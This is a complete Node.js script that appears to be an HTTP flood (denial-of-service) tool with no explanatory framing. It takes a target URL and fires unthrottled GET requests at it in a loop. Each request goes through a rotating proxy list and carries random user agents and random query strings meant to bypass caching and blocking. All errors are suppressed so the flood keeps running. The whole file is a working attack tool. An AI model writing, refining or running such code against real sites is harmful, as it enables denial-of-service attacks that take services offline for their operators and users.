import request from 'request'
import fs from "fs"
import cryptoRandomString from 'crypto-random-string'
import randomUseragent from 'random-useragent'


let uri = process.argv[2];
let proxies = fs.readFileSync('soyasauce.txt', 'utf-8').replace(/\r/gi, '').split('\n');

function send_request(){
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    request.get({
        url: uri + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}),
        proxy: "http://" + proxy,
        headers: {
            'User-Agent': randomUseragent.getRandom()
        }
    });
}


setInterval(() => {
    send_request();
});


console.log("Thunderbolt.")

process.on('uncaughtException', function (err) {
   
});
process.on('unhandledRejection', function (err) {
   
});